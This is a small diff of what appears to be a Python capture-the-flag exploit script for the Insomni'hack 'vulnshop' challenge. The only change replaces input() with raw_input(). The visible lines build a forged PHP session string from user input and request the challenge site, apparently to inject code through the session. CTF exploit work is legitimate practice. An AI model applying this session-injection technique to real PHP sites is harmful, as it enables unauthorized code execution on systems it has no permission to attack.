@@ -3,7 +3,7 @@ import re
 from bs4 import BeautifulSoup
 
 while True:
-    code = input(">> ")
+    code = raw_input(">> ")
     payload = "challenge|s:{}:\"{}\";".format(len(code), code)
     # new session
     req = requests.get('http://vulnshop.teaser.insomnihack.ch/?page=contactus')
